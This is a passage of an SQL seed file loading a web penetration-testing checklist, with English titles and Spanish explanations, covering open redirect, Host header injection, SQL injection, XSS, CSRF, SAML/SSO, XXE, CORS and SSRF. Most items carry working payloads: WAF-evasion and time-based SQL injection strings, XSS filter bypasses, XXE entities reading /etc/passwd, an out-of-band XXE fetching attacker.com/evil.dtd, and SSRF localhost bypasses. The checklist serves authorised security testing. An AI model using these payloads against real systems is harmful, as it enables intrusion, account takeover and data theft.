(9, 'Schedule transfer: Can user A change the details of schedule transfer for user B', '## Secuestro de Transferencias Programadas\n\n- **Ataque:** Modificar una transferencia recurrente legítima para que el dinero vaya a la cuenta del atacante.', 24),

(9, 'NEFT: Amount manipulation via NEFT transfer', '## Lógica Específica de Protocolo\n\n- **NEFT/SEPA/SWIFT:** A veces tienen validaciones distintas a las transferencias internas. Probar límites máximos y mínimos.', 25),

(9, 'NEFT: Check if user A can view the NEFT transfer details of user B', '## Logs de Transferencia\n\n- **Prueba:** IDOR en recibos de transferencia.', 26),

(9, 'Bill Payment: Check if user can register payee without any checker approval', '## Control Dual\n\n- **Empresas:** Verificar si un usuario "Maker" puede aprobar sus propios pagos sin un usuario "Checker".', 27),

(9, 'Bill Payment: Check if user A can view the pending payments of user B', '## Privacidad\n\n- **Prueba:** Ver facturas de luz/agua pendientes de otros usuarios.', 28),

(9, 'Bill Payment: Check if user A can view the payment made details of user B', '## Historial de Pagos\n\n- **Prueba:** Acceder a recibos históricos.', 29);

-- ==========================================
-- CATEGORY: Open Redirection Testing (ID 10)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(10, 'Use burp find option to find parameters such as URL, red, redirect, redir, origin', '## Identificación de Parámetros\n\nLos desarrolladores suelen usar nombres predecibles para redirecciones.\n\n- **Lista común:** `next`, `url`, `target`, `r`, `dest`, `destination`, `redir`, `redirect_uri`, `return_to`, `out`.\n- **Acción:** Usa "Grep" en Burp Suite o herramientas como `ParamMiner` para descubrirlos.', 1),

(10, 'Check the value of these parameter which may contain a URL', '## Análisis de Valores\n\n- **Observación:** Si ves `?next=/home`, es una redirección relativa. Si ves `?next=http://google.com`, es absoluta.\n- **Prueba:** Decodifica el valor (URL Decode) para ver si hay URLs camufladas.', 2),

(10, 'Change the URL value and check if gets redirected', '## Prueba Básica\n\n- **Payload:** `?next=http://attacker.com`\n- **Verificación:** Revisa si la respuesta es `301/302` y el header `Location: http://attacker.com`.\n- **Impacto:** Phishing altamente efectivo (la víctima confía en el dominio original).', 3),

(10, 'Try Single Slash and url encoding', '## Evasión de Filtros Básicos\n\n- **Técnica:** Si bloquean `http://`, prueba sin protocolo.\n- **Payloads:**\n  - `?url=/attacker.com` (A veces interpretado como relativo al root, a veces como protocolo agnóstico)\n  - `?url=%68%74%74%70%3a%2f%2fattacker.com` (Full URL Encoding).', 4),

(10, 'Using a whitelisted domain or keyword', '## Bypass de Whitelist\n\n- **Escenario:** El servidor solo permite redirecciones si contienen "google.com".\n- **Payloads:**\n  - `google.com.attacker.com` (Subdominio)\n  - `attacker.com/google.com` (Path)\n  - `attacker.com?q=google.com` (Query param).', 5),

(10, 'Using // to bypass http blacklisted keyword', '## Protocol Relative URL\n\n- **Concepto:** Los navegadores interpretan `//` como "usa el mismo protocolo que la página actual".\n- **Payload:** `?url=//attacker.com`.\n- **Resultado:** Redirige a `https://attacker.com` si la víctima está en HTTPS.', 6),

(10, 'Using https: to bypass // blacklisted keyword', '## Variaciones de Protocolo\n\n- **Payload:** `?url=https:attacker.com` (Nota la falta de `//`).\n- **Comportamiento:** Firefox y Chrome a veces corrigen esto y redirigen correctamente.', 7),

(10, 'Using \\\\ to bypass // blacklisted keyword', '## Normalización de Barras\n\n- **Payload:** `?url=\\/\\/attacker.com` o `?url=\\\\attacker.com`.\n- **Teoría:** Algunos frameworks backend normalizan las barras invertidas a barras normales antes de procesar, pero el filtro de seguridad (WAF) no lo detecta.', 8),

(10, 'Using \\/\\/ to bypass // blacklisted keyword', '## Ofuscación Mixta\n\n- **Payload:** `?url=\\/\\/attacker.com`.\n- **Objetivo:** Confundir expresiones regulares mal construidas que buscan `//` estricto.', 9),

(10, 'Using null byte %00 to bypass blacklist filter', '## Truncamiento de Cadenas\n\n- **Payload:** `?url=http://attacker.com%00http://trusted.com`.\n- **Teoría:** El filtro lee hasta el final ("contiene trusted.com" -> OK). La redirección lee hasta el `%00` ("attacker.com").', 10),

(10, 'Using ° symbol to bypass', '## Unicode Normalization\n\n- **Payload:** `?url=https://google.com°@attacker.com`.\n- **Explicación:** El símbolo `°` a veces es ignorado o transformado por el navegador o backend, convirtiendo la URL en `google.com@attacker.com` (donde google.com es el usuario y attacker.com el dominio real).', 11);

-- ==========================================
-- CATEGORY: Host Header Injection (ID 11)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(11, 'Supply an arbitrary Host header', '## Manipulación Básica\n\n- **Prueba:** Intercepta la petición. Cambia `Host: target.com` a `Host: attacker.com`.\n- **Check:** Si la respuesta devuelve un `302 Found` con `Location: http://attacker.com/...` o genera links en el HTML apuntando a tu dominio, es vulnerable.\n- **Impacto:** Cache Poisoning, Password Reset Poisoning.', 1),

(11, 'Check for flawed validation', '## Puertos No Estándar\n\n- **Prueba:** `Host: target.com:bad-port`.\n- **Fallo:** Si el servidor devuelve un error revelando configuración interna o permite la inyección de caracteres no numéricos.', 2),

(11, 'Send ambiguous requests: Inject duplicate Host headers', '## Confusión del Servidor\n\n- **Payload:**\n  ```\n  GET / HTTP/1.1\n  Host: target.com\n  Host: attacker.com\n  ```\n- **Objetivo:** Ver cuál de los dos toma el servidor (el primero o el último). Si el WAF revisa el primero pero el servidor usa el último, hay bypass.', 3),

(11, 'Send ambiguous requests: Supply an absolute URL', '## Absolute URI vs Host Header\n\n- **Payload:** `GET http://target.com/ HTTP/1.1` con `Host: attacker.com`.\n- **RFC:** El RFC dice que la URL absoluta tiene preferencia, pero muchos servidores la ignoran y usan el Host header para generar enlaces.', 4),

(11, 'Send ambiguous requests: Add line wrapping', '## Indentación Maliciosa\n\n- **Payload:**\n  ```\n  GET / HTTP/1.1\n   Host: attacker.com\n  Host: target.com\n  ```\n- **Objetivo:** Algunos servidores interpretan la línea indentada como parte del header anterior, otros como un nuevo header.', 5),

(11, 'Inject host override headers', '## Headers Alternativos\n\n- **Lista:** Prueba inyectar estos headers manteniendo el Host original intacto:\n  - `X-Forwarded-Host: attacker.com`\n  - `X-Host: attacker.com`\n  - `X-Forwarded-Server: attacker.com`\n- **Resultado:** Muchos frameworks (Django, Rails) usan estos headers para construir enlaces absolutos.', 6);

-- ==========================================
-- CATEGORY: SQL Injection Testing (ID 12)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(12, 'Entry point detection: Simple characters', '## Fuzzing Básico\n\nIdentifica errores de sintaxis rompiendo la query.\n\n- **Caracteres:** `''` (Comilla simple), `"` (Doble), `;` (Punto y coma), `)` (Paréntesis de cierre).\n- **Indicador:** Error 500, mensajes explícitos ("Syntax error near..."), o desaparición parcial de contenido en la respuesta.', 1),

(12, 'Entry point detection: Multiple encoding', '## Evasión de Filtros de Entrada\n\n- **Técnica:** Double URL Encode (`%2527`), Hex Encoding (`0x27`), Unicode Variations.\n- **Objetivo:** El WAF decodifica una vez (viendo caracteres seguros), pero la aplicación decodifica de nuevo entregando el payload malicioso a la DB.', 2),

(12, 'Entry point detection: Merging characters', '## Concatenación de Strings\n\nConfirma la inyección uniendo cadenas.\n\n- **MySQL:** `id=1 CONCAT(char(65))`\n- **MSSQL:** `id=1+''A''`\n- **Oracle/Postgres:** `id=1||''A''`\n- **Resultado:** Si devuelve "1A" o no da error, la inyección es exitosa.', 3),

(12, 'Entry point detection: Logic Testing', '## Inyección Booleana (Blind)\n\n\n\nPrueba condiciones verdaderas y falsas.\n\n- **True:** `id=1 AND 1=1` (La página carga normal).\n- **False:** `id=1 AND 1=0` (La página carga vacía o falta contenido).\n- **Conclusión:** Si el comportamiento difiere, el backend está evaluando tu lógica.', 4),

(12, 'Entry point detection: Weird characters', '## Caracteres Límite\n\n- **Caracteres:** Barra invertida `\\`, Byte Nulo `%00`, caracteres multibyte.\n- **Objetivo:** Causar errores de truncamiento o encoding que expongan la estructura de la consulta.', 5),

(12, 'Run SQL injection scanner on all requests', '## Automatización\n\n- **Herramientas:** `SQLMap`, `Burp Scanner`, `Ghauri`.\n- **Comando Básico:** `sqlmap -u "http://target.com?id=1" --batch --dbs`.\n- **Riesgo:** Alto ruido en logs. Úsalo con precaución en producción.', 6),

(12, 'Bypassing WAF: Using Null byte before SQL query', '## Confusión del WAF\n\n- **Payload:** `id=1 %00 '' OR 1=1`.\n- **Teoría:** Algunos WAFs escritos en C dejan de leer tras el null byte, pero la aplicación (PHP/Java) pasa la cadena completa a la base de datos.', 7),

(12, 'Bypassing WAF: Using SQL inline comment sequence', '## Fragmentación de Keywords\n\n- **Payload:** `UN/**/ION SE/**/LECT`.\n- **Objetivo:** Romper la firma del WAF que busca la palabra "UNION" seguida de un espacio, reemplazando el espacio por comentarios de bloque C-Style.', 8),

(12, 'Bypassing WAF: URL encoding', '## Ofuscación Estándar\n\n- **Prueba:** Codificar todo el payload.\n- **Payload:** `%55NION %53ELECT`.\n- **Variante:** IBM DB2 a veces permite `%` entre letras para ofuscación.', 9),

(12, 'Bypassing WAF: Changing Cases (uppercase/lowercase)', '## Filtros Case-Sensitive\n\n- **Payload:** `SeLeCt * FrOm users`.\n- **Efectividad:** SQL es case-insensitive por estándar, pero algunos filtros regex antiguos (`/SELECT/`) solo buscan mayúsculas.', 10),

(12, 'Bypassing WAF: Use SQLMAP tamper scripts', '## Scripts de Evasión\n\n- **Comando:** `sqlmap ... --tamper=space2comment,between,randomcase`.\n- **Función:** Modifican el payload automáticamente (e.g., cambia espacios por `+`, `/**/` o `%09`) para evadir reglas específicas.', 11),

(12, 'Time Delays: Oracle dbms_pipe.receive_message', '## Oracle Time-Based Blind\n\n\n\n- **Payload:** `'' OR dbms_pipe.receive_message((''a''),10)--`\n- **Efecto:** Pausa la ejecución de la query por 10 segundos exactamente en bases Oracle.', 12),

(12, 'Time Delays: Microsoft WAITFOR DELAY', '## MSSQL Time-Based Blind\n\n- **Payload:** `'' WAITFOR DELAY ''0:0:10''--`\n- **Efecto:** Pausa el hilo por 10 segundos en SQL Server.', 13),

(12, 'Time Delays: PostgreSQL pg_sleep', '## Postgres Time-Based Blind\n\n- **Payload:** `'' || pg_sleep(10)--` o `; SELECT pg_sleep(10)--`\n- **Efecto:** Muy efectivo en inyecciones "Stacked Queries". Duerme el proceso 10 segundos.', 14),

(12, 'Time Delays: MySQL sleep', '## MySQL Time-Based Blind\n\n- **Payload:** `'' AND SLEEP(10)--` o `'' OR SLEEP(10)--`\n- **Advertencia:** Si la tabla tiene 100 filas y usas WHERE, podría dormir 100 x 10 segundos (DoS).', 15),

(12, 'Conditional Delays: Oracle', '## Inferencia Lógica (Oracle)\n\n- **Payload:** `CASE WHEN (SELECT count(*) FROM users) > 0 THEN dbms_pipe.receive_message((''a''),10) ELSE NULL END`\n- **Uso:** Si tarda 10s, la condición es verdadera (existen usuarios).', 16),

(12, 'Conditional Delays: Microsoft', '## Inferencia Lógica (MSSQL)\n\n- **Payload:** `IF (1=1) WAITFOR DELAY ''0:0:10''`\n- **Uso:** Extraer datos carácter por carácter basándose en el tiempo de respuesta.', 17),

(12, 'Conditional Delays: PostgreSQL', '## Inferencia Lógica (Postgres)\n\n- **Payload:** `CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END`\n- **Uso:** Confirmar inyecciones ciegas donde no se ven errores ni output.', 18),

(12, 'Conditional Delays: MySQL', '## Inferencia Lógica (MySQL)\n\n- **Payload:** `IF(1=1, SLEEP(10), 0)`\n- **Uso:** La forma más común de extraer datos en Blind SQLi en MySQL.', 19);

-- ==========================================
-- CATEGORY: Cross-Site Scripting Testing (ID 13)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(13, 'Try XSS using QuickXSS tool by theinfosecguy', '## Automatización Rápida\n\n- **Uso:** Herramienta para probar múltiples payloads en inputs reflejados.\n- **Objetivo:** Identificar qué caracteres especiales (`<`, `>`, `''''`, `"`) no están siendo filtrados por el backend.\n- **Nota:** `''''` representa la comilla simple.', 1),

(13, 'Upload file using img src=x onerror=alert payload', '## Reflected XSS (HTML Context)\n\n\n\n- **Payload:** `<img src=x onerror=alert(document.domain)>`\n- **Mecanismo:** El navegador intenta cargar la imagen "x". Al fallar, ejecuta el evento `onerror`.\n- **Contexto:** Funciona si el input se refleja dentro del HTML pero fuera de un atributo.', 2),

(13, 'If script tags are banned, use <h1> and other HTML tags', '## Dangling Markup / Event Injection\n\n- **Escenario:** El WAF bloquea `<script>`.\n- **Prueba:** Inyecta HTML válido como `<h1>test</h1>`.\n- **Escalada:** Si se renderiza, prueba eventos en etiquetas permitidas: `<body onload=alert(1)>` o `<svg/onload=alert(1)>`.', 3),

(13, 'If output is reflected back inside the JavaScript use alert(1)', '## Break out of JS Context\n\n\n\n- **Contexto:** `<script>var user = "INPUT";</script>`\n- **Payload:** `"; alert(1); //`\n- **Resultado:** `<script>var user = ""; alert(1); //";</script>`\n- **Explicación:** Cierras la cadena, cierras la sentencia, inyectas código y comentas el resto.', 4),

(13, 'If " are filtered then use img src=d onerror=confirm payload', '## Atributos Sin Comillas\n\n- **Payload:** `<img src=x onerror=confirm(1)>` o `alert(/XSS/)`.\n- **Técnica:** HTML5 es permisivo. Los navegadores modernos permiten atributos sin comillas si no contienen espacios. `confirm()` es útil si `alert()` está bloqueado.', 5),

(13, 'Upload a JavaScript using Image file', '## Stored XSS via SVG\n\n\n\n- **Vector:** Subida de archivos (File Upload).\n- **Payload:** Crea un archivo `.svg` con: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`.\n- **Ejecución:** Si la aplicación muestra la imagen directamente (sin Content-Disposition: attachment), el JS se ejecuta.', 6),

(13, 'Unusual way to execute JS payload is to change method from POST to GET', '## Evasión de WAF por Verbo HTTP\n\n- **Técnica:** Si el ataque es bloqueado en una petición POST.\n- **Acción:** Cambia el método a GET (o incluso HEAD/PUT en algunas APIs mal configuradas).\n- **Fallo:** A veces las reglas del WAF solo están aplicadas al cuerpo del POST y no a la URL.', 7),

(13, 'Tag attribute value: Input landed in input tag', '## Salir del Atributo\n\n- **Contexto:** `<input value="USER_INPUT">`\n- **Payload:** `" onmouseover="alert(1)`\n- **Inyección:** Convierte el input de datos en un evento ejecutable (`onmouseover`, `onclick`, `onfocus`).', 8),

(13, 'Tag attribute value: Payload to be inserted with onfocus', '## Autofocus XSS\n\n- **Payload:** `" autofocus onfocus="alert(1)`\n- **Ventaja:** No requiere interacción del usuario. El navegador pone el foco automáticamente en el input al cargar la página, disparando el evento.', 9),

(13, 'Tag attribute value: Syntax Encoding payload', '## HTML Entity Encoding\n\n- **Payload:** `jav&#x61;script:alert(1)` (en un href).\n- **Contexto:** Funciona dentro de atributos que esperan URLs como `href` o `src`. El navegador decodifica la entidad antes de procesar el protocolo.', 10),

(13, 'XSS filter evasion: < and > can be replace with html entities', '## Doble Decodificación\n\n- **Payload:** `&lt;script&gt;alert(1)&lt;/script&gt;`\n- **Condición:** Solo funciona si el backend decodifica explícitamente las entidades HTML antes de reflejarlas en la página (Error de lógica).', 11),

(13, 'XSS filter evasion: Try an XSS polyglot', '## Polyglot Injection\n\n\n\n- **Concepto:** Una cadena compleja diseñada para "escapar" de múltiples contextos a la vez (Atributo, Script, HTML).\n- **Uso:** Copia payloads de la lista "OWASP Polyglot" o "Seclists". Son útiles para escaneos ciegos.', 12),

(13, 'XSS Firewall Bypass: Check if the firewall is blocking only lowercase', '## Case Sensitivity Bypass\n\n- **Payload:** `<ScRiPt>alert(1)</sCrIpT>` o `<ImG SrC=x OnErRoR=alert(1)>`.\n- **Fallo:** Regex mal construidos que buscan `[a-z]` en lugar de `[a-zA-Z]`.', 13),

(13, 'XSS Firewall Bypass: Try to break firewall regex with new line', '## Multiline Bypass\n\n- **Payload:** `<img src=x \\n onerror=alert(1)>`.\n- **Teoría:** En expresiones regulares, el punto `.` a menudo no coincide con saltos de línea (`\\n`), permitiendo que el payload pase el filtro.', 14),

(13, 'XSS Firewall Bypass: Try Double Encoding', '## Codificación Anidada\n\n- **Payload:** `%253Cscript%253Ealert(1)%253C%252Fscript%253E`\n- **Proceso:** El WAF decodifica `%25` a `%`. El backend recibe `%3C` y lo decodifica a `<`.', 15),

(13, 'XSS Firewall Bypass: Testing for recursive filters', '## Filtros No Recursivos\n\n- **Mecanismo:** El filtro busca `script` y lo elimina.\n- **Payload:** `<scrscriptipt>alert(1)</scrscriptipt>`.\n- **Resultado:** Al eliminar el `script` central, las partes restantes (`scr` + `ipt`) se unen, reconstruyendo la etiqueta maliciosa.', 16),

(13, 'XSS Firewall Bypass: Injecting anchor tag without whitespaces', '## XSS Sin Espacios\n\n- **Payload:** `<a/href="javascript:alert(1)">Click</a>`\n- **Nota:** La barra `/` es un separador válido en HTML entre el nombre de la etiqueta y sus atributos.', 17),

(13, 'XSS Firewall Bypass: Try to bypass whitespaces using Bullet', '## Separadores Alternativos\n\n- **Payload:** `<svg•onload=alert(1)>`\n- **Técnica:** Usar caracteres ASCII/Unicode raros (como bullets, tabuladores verticales, form feeds) que el navegador interpreta como espacio pero el WAF no.', 18),

(13, 'XSS Firewall Bypass: Try to change request method', '## Evasión de Método (Revisión)\n\n- **Estrategia:** Similar al item 7. Verifica si `PUT`, `DELETE` o `PATCH` son aceptados y si el WAF inspecciona los payloads en esos verbos.', 19);

-- ==========================================
-- CATEGORY: CSRF Testing (ID 14)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(14, 'Anti-CSRF token: Removing the Anti-CSRF Token', '## Validación de Existencia\n\n- **Prueba:** Intercepta la petición y elimina completamente el parámetro `csrf_token` (del body o query).\n- **Fallo:** El backend verifica el token *si está presente*, pero si falta, asume que es una petición segura y la procesa.', 1),

(14, 'Anti-CSRF token: Altering the Anti-CSRF Token', '## Validación de Integridad\n\n- **Prueba:** Cambia el último carácter del token.\n- **Fallo:** Verifica si el servidor valida criptográficamente el token o solo comprueba que tenga la longitud o formato correcto.', 2),

(14, 'Anti-CSRF token: Using the Attacker''s Anti-CSRF Token', '## Token Swapping (Falta de Session Binding)\n\n- **Prueba:** Genera un token válido con tu cuenta de atacante. Úsalo en la petición CSRF enviada a la víctima.\n- **Fallo:** El servidor acepta cualquier token válido generado por el sistema, sin comprobar si pertenece a la sesión del usuario actual.', 3),

(14, 'Anti-CSRF token: Spoofing the Anti-CSRF Token', '## Tokens Débiles\n\n- **Análisis:** Revisa si el token es predecible (e.g., MD5 del UserID, Base64 del timestamp o simplemente el SessionID repetido).\n- **Ataque:** Si puedes deducir el algoritmo, puedes falsificar tokens para cualquier usuario.', 4),

(14, 'Anti-CSRF token: Using guessable Anti-CSRF Tokens', '## Entropía Baja\n\n- **Prueba:** Captura varios tokens y analiza si son secuenciales o tienen patrones fijos. Deben ser aleatorios criptográficamente seguros.', 5),

(14, 'Anti-CSRF token: Stealing Anti-CSRF Tokens', '## Fuga de Tokens\n\n- **Vectores:**\n  - **XSS:** Lectura del DOM para robar el token.\n  - **Referer:** Si el token va en la URL GET, se filtra en el header Referer a sitios externos.\n  - **CSS Injection:** Exfiltración del valor del input hidden.', 6),

(14, 'Double Submit Cookie: Check for session fixation on subdomains', '## Cookie Forcing\n\n- **Técnica:** Si controlas un subdominio (o tienes XSS en él), puedes establecer una cookie `csrf` en el dominio padre y luego enviar el mismo valor en el body de la petición CSRF.', 7),

(14, 'Double Submit Cookie: Man in the the middle attack', '## HTTP Downgrade\n\n- **Escenario:** El mecanismo "Double Submit" confía en que `Cookie == BodyParam`. Si la cookie no tiene el flag `Secure`, un atacante MITM puede sobrescribirla via HTTP para que coincida con su payload.', 8),

(14, 'Referrer/Origin validation: Restricting the CSRF POC from sending Referrer header', '## Bypass de Validación de Origen\n\n- **Prueba:** Si el sitio bloquea orígenes externos, intenta enviar la petición sin header Referer.\n- **Payload:** `<meta name="referrer" content="no-referrer">` en tu página maliciosa.', 9),

(14, 'Referrer/Origin validation: Bypass whitelisting/blacklisting mechanism', '## Evasión de Regex\n\n- **Objetivo:** Engañar al filtro que busca `target.com`.\n- **Payloads:**\n  - `target.com.attacker.com`\n  - `attacker.com/target.com`\n  - `attacker.com?q=target.com`', 10),

(14, 'JSON/XML format: By using normal HTML Form1', '## Content-Type Spoofing\n\n- **Truco:** Enviar un formulario HTML normal a un endpoint JSON.\n- **Payload:** `<input name=''{"param":"value", "ignore":"'' value=''"}'' type=''hidden''>`.\n- **Resultado:** El backend recibe `{"param":"val", "ignore":"=..."}` y a veces lo parsea como JSON válido.', 11),

(14, 'JSON/XML format: By using normal HTML Form2 (Fetch Request)', '## Uso de API Fetch\n\n- **Nota:** Fetch no envía cookies cross-origin salvo que sea un "Simple Request".\n- **Prueba:** Usar `text/plain` en lugar de `application/json` si el backend lo permite.', 12),

(14, 'JSON/XML format: By using XMLHTTP Request/AJAX request', '## CORS Misconfiguration\n\n- **Requisito:** Para hacer CSRF con JSON real y headers custom, necesitas que el sitio víctima tenga una política CORS insegura (`Access-Control-Allow-Origin: *` o reflejado con `Credentials: true`).', 13),

(14, 'JSON/XML format: By using Flash file', '## Flash CSRF (Legacy)\n\n- **Nota:** Obsoleto. Solo relevante en entornos legacy muy antiguos con archivos `crossdomain.xml` permisivos.', 14),

(14, 'Samesite Cookie: SameSite Lax bypass via method override', '## Método GET\n\n- **Concepto:** `SameSite=Lax` permite enviar cookies en navegaciones Top-Level (enlaces, GET).\n- **Ataque:** Si el endpoint sensible acepta GET (o `_method=GET`), puedes hacer CSRF aunque tenga Lax.', 15),

(14, 'Samesite Cookie: SameSite Strict bypass via client-side redirect', '## Gadgets de Redirección\n\n\n\n- **Flujo:** Usa un Open Redirect en el sitio víctima. Al redirigir internamente al endpoint sensible, el navegador considera que la petición viene del mismo sitio y envía la cookie Strict.', 16),

(14, 'Samesite Cookie: SameSite Strict bypass via sibling domain', '## Dominios Hermanos\n\n- **Ataque:** Si tienes XSS en `blog.site.com`, puedes hacer peticiones a `app.site.com` (mismo eTLD+1) saltando la restricción Strict.', 17),

(14, 'Samesite Cookie: SameSite Lax bypass via cookie refresh', '## Ventana Temporal\n\n- **Teoría:** Algunos navegadores antiguos permitían un periodo de gracia (2 min) tras setear la cookie donde Lax se comportaba como None.', 18);

-- ==========================================
-- CATEGORY: SSO Vulnerabilities (ID 15)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(15, 'If internal.company.com Redirects You To SSO, Do FUZZ On Internal', '## Descubrimiento de Apps Internas\n\n- **Escenario:** El subdominio redirige al login SSO.\n- **Acción:** Fuzzear rutas (`/admin`, `/status`, `/api`) antes de la redirección. A veces las reglas de reescritura fallan en ciertas rutas.', 1),

(15, 'If company.com/internal Redirects To SSO, Try company.com/public/internal', '## Bypass de Reglas de Proxy\n\n- **Técnica:** URL Path Confusion.\n- **Payloads:**\n  - `/internal/./`\n  - `/public/..;/internal`\n  - `/%2e/internal`\n- **Objetivo:** Confundir al Reverse Proxy para acceder al recurso sin triggerar el SSO.', 2),

(15, 'Try To Craft SAML Request With Token And Send It To The Server', '## SAML Replay / Injection\n\n- **Prueba:** Captura un `SAMLResponse` válido. Intenta reenviarlo más tarde (Replay) o modificarlo si no está firmado.', 3),

(15, 'If There Is AssertionConsumerServiceURL Try To Insert Your Domain', '## Robo de Tokens SAML\n\n- **Parámetro:** Busca `AssertionConsumerServiceURL` o `ACSUrl` en la petición de login.\n- **Ataque:** Cambia la URL a `attacker.com`. Si el IdP lo permite, enviará el token de autenticación a tu servidor.', 4),

(15, 'If There Is AssertionConsumerServiceURL Try To Do FUZZ On Value', '## Open Redirect en SSO\n\n- **Prueba:** Si no puedes robar el token, intenta al menos conseguir una redirección abierta usando el parámetro `RelayState` o el ACS.', 5),

(15, 'If There Is Any UUID, Try To Change It To UUID Of Victim', '## IDOR en SSO\n\n- **Contexto:** En el flujo OAuth/SAML, a veces se pasa un ID de usuario.\n- **Ataque:** Cámbialo por el de la víctima para ver si el proveedor de identidad te loguea como ella.', 6),

(15, 'Try To Figure Out If Server Vulnerable To XML Signature Wrapping', '## XML Signature Wrapping (XSW)\n\n\n\n- **Concepto:** El servidor verifica la firma de un bloque XML, pero la aplicación lee otro bloque (inyectado) con datos falsos.\n- **Herramienta:** SAML Raider (Extensión de Burp).', 7),

(15, 'Try To Figure Out If Server Checks The Identity Of The Signer', '## Validación de Certificado\n\n- **Prueba:** Firma la aserción SAML con tu propio certificado autofirmado.\n- **Fallo:** Si el servidor acepta cualquier firma válida (sin verificar la cadena de confianza), puedes falsificar cualquier identidad.', 8),

(15, 'Try To Inject XXE Payloads At The Top Of The SAML Response', '## XXE en SAML\n\n- **Vector:** Las aserciones SAML son XML en Base64.\n- **Payload:** Inyecta `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` antes del nodo raíz y referencia `&xxe;` en un atributo.', 9),

(15, 'Try To Inject XSLT Payloads Into The Transforms Element', '## Inyección XSLT\n\n- **Vector:** Dentro de `<ds:Transforms>` en la firma XML.\n- **Impacto:** Ejecución remota de código o lectura de archivos si el motor XML procesa transformaciones maliciosas.', 10),

(15, 'If Victim Can Accept Tokens Issued By Same Identity Provider', '## Confusión de Audiencia\n\n- **Escenario:** App A y App B usan el mismo IdP (e.g., Google).\n- **Ataque:** Obtén un token válido para "Tu App Maliciosa". Envíalo a "App Víctima".\n- **Fallo:** Si la App Víctima no verifica el campo `aud` (Audiencia), aceptará el token.', 11),

(15, 'While Testing SSO Try To search In Burp About URLs In Cookie Header', '## SSRF via Cookie\n\n- **Prueba:** A veces los sistemas de SSO guardan la URL de "retorno" o "estado" dentro de una cookie.\n- **Ataque:** Decodifica cookies y busca URLs internas.', 12);

-- ==========================================
-- CATEGORY: XML Injection Testing (ID 16)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(16, 'Change the content type to text/xml and test XXE with /etc/passwd', '## Content-Type Spoofing\n\n- **Prueba:** Si el endpoint acepta JSON, cambia `Content-Type: application/json` a `text/xml`.\n- **Payload:** Envia XML válido. Si el parser XML está habilitado por defecto, podría procesarlo.', 1),

(16, 'Test XXE with /etc/hosts', '## Lectura de Archivos Locales (LFI)\n\n- **Payload:**\n  ```xml\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>\n  <root>&xxe;</root>\n  ```\n- **Objetivo:** Verificar mapeos de red interna.', 2),

(16, 'Test XXE with /proc/self/cmdline', '## Reconocimiento de Sistema\n\n- **Payload:** `file:///proc/self/cmdline`\n- **Info:** Revela el comando que ejecutó el proceso (útil para saber si es Java, Python, banderas de inicio).', 3),

(16, 'Test XXE with /proc/version', '## Versión del Kernel\n\n- **Payload:** `file:///proc/version`\n- **Uso:** Identificar el sistema operativo y versión del kernel para buscar exploits de escalada de privilegios locales.', 4),

(16, 'Blind XXE with out-of-band interaction', '## XXE Ciego (OOB)\n\n- **Escenario:** El servidor procesa el XML pero no muestra el resultado en la respuesta.\n- **Payload:**\n  ```xml\n  <!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "[http://attacker.com/evil.dtd](http://attacker.com/evil.dtd)">\n  %xxe;\n  ]>\n  ```\n- **Objetivo:** Forzar al servidor a conectar con tu máquina (SSRF) o exfiltrar datos vía DNS/HTTP.', 5);

-- ==========================================
-- CATEGORY: CORS (ID 17)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(17, 'Errors parsing Origin headers', '## Reflejo de Origen (Origin Reflection)\n\n- **Prueba:** Envía `Origin: http://attacker.com`.\n- **Fallo:** Si la respuesta contiene `Access-Control-Allow-Origin: http://attacker.com` y `Access-Control-Allow-Credentials: true`.\n- **Impacto:** Permite robar datos de usuarios autenticados vía JS.', 1),

(17, 'Whitelisted null origin value', '## Origen Null\n\n- **Prueba:** Envía `Origin: null`.\n- **Fallo:** Si responde con `Allow-Origin: null`, es explotable desde iframes sandboxeados (`<iframe sandbox="allow-scripts ...">`) que envían `null` como origen.', 2);

-- ==========================================
-- CATEGORY: SSRF (ID 18)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(18, 'Try basic localhost payloads', '## Acceso Loopback\n\n- **Payloads:**\n  - `http://localhost`\n  - `http://127.0.0.1`\n  - `http://0.0.0.0`\n- **Objetivo:** Acceder a paneles de administración internos o métricas no expuestas.', 1),

(18, 'Bypassing filters: Bypass using HTTPS', '## Protocolo Seguro\n\n- **Prueba:** `https://127.0.0.1` o `https://localhost`.\n- **Motivo:** A veces los filtros solo buscan "http://".', 2),

(18, 'Bypassing filters: Bypass with [::]', '## IPv6\n\n- **Payload:** `http://[::]:80/`\n- **Motivo:** Muchos filtros regex solo están diseñados para IPv4.', 3),

(18, 'Bypassing filters: Bypass with a domain redirection', '## Redirección DNS\n\n- **Servicio:** Usa `nip.io` o tu propio dominio.\n- **Payload:** `http://127.0.0.1.nip.io` -> Resuelve a 127.0.0.1.\n- **Técnica:** El filtro ve un dominio, pero el backend conecta a localhost.', 4),

(18, 'Bypassing filters: Bypass using a decimal IP location', '## Codificación Decimal/Octal\n\n- **Decimal:** `http://2130706433` (= 127.0.0.1)\n- **Octal:** `http://0177.0.0.1`\n- **Hex:** `http://0x7f000001`', 5),

(18, 'Bypassing filters: Bypass using IPv6/IPv4 Address Embedding', '## Direcciones Híbridas\n\n- **Payload:** `http://[0:0:0:0:0:ffff:127.0.0.1]`\n- **Uso:** Evasión de filtros que no normalizan direcciones IP.', 6),

(18, 'Bypassing filters: Bypass using malformed urls', '## Rarezas de Parser\n\n- **Payloads:**\n  - `http://localhost#@google.com`\n  - `http://foo@localhost:80`\n  - `http://127.0.0.1:80\x00`', 7),

(18, 'Bypassing filters: Bypass using rare address', '## DNS Alternativos\n\n- **Payload:** `http://localtest.me` (Resuelve a 127.0.0.1).', 8),

